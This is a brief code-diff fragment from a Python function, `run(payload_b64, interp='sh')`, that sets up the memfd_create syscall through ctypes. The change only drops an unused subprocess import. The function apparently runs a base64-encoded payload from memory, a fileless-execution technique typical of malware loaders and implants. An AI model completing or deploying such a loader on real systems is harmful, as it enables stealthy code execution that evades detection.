@@ -25,7 +25,6 @@ def run(payload_b64, interp="sh"):
     try:
         import ctypes
         import platform
-        import subprocess
         libc = ctypes.CDLL(None)
         # memfd_create: x86_64=319, aarch64=385
         syscall_n = 319 if platform.machine() in ("x86_64", "amd64") else 385
